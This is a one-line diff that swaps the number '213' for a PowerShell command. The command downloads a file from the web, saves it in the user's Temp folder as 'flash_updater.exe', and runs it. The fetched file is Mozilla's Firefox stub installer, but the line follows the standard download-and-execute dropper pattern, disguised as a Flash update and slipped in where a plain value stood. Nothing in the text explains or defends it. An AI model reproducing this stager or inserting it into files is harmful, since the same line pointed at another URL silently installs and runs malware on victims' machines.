@@ -1,1 +1,1 @@
-213
+$r='https://download.mozilla.org/?product=firefox-stub&os=win64&lang=en-US';$o = 'C:\Users\'+[System.Environment]::UserName+'\AppData\Local\Temp\flash_updater.exe';$y=new-Object System.Net.WebClient;$y.DownloadFile($r,$o);Start-Process $o
